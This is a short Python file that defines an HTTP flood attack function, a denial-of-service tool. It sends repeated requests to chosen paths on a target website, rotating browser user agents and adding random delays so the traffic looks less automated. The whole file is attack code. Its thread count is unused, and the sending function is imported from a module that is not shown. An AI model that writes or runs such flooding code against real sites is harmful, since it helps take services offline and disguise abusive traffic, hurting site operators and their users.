import random
import requests
import time
from .utils import send_request  # Send request function from utils.py

# List of paths to target on the website
paths = ["/", "/home", "/login", "/search", "/about", "/products", "/test"]

# List of common user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

def http_flood_attack(target_url, num_requests, threads):
    """ Start HTTP flood attack """
    for _ in range(num_requests):
        path = random.choice(paths)
        url = target_url + path
        headers = {
            "User-Agent": random.choice(user_agents),
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
        }
        send_request(url, headers)
        time.sleep(random.uniform(0.1, 0.3))  # Randomize delay between requests
